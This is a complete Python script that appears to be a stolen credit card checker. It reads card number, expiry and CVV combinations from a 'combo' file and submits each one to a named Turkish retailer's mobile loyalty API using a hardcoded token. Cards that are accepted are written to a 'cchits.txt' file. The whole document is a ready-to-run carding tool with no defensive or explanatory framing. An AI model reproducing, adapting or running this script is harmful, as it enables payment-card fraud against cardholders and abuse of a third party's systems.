import requests, time, os
from cfonts import render

print(render('cc', colors=['white','red'], align='center'))
 
with open(input('combo: ')) as f:
    for l in f:
        if '|' not in l: continue
        k,a,y,c = l.strip().split('|')
        print(f'[{k}]', end=' ')
        try:
            r = requests.get('https://mpecom-apigw-prod.boyner.com.tr/mobile2/mbOrder/GetRetrieveLoyalties',
                            params={'CardNo':k,'ExpMonth':a,'ExpYear':y,'SecureCode':c},
                            headers={'user-agent':'Mozilla/5.0','token':'b1329252-7b99-4dfc-b38a-480849e7b224'})
            if r.json().get('IsSuccess'):
                print('✅')
                with open('cchits.txt','a') as g: g.write(f'{k}|{a}|{y}|{c}\n')
            else: print('❌')
        except: print('⚠️')
        time.sleep(1)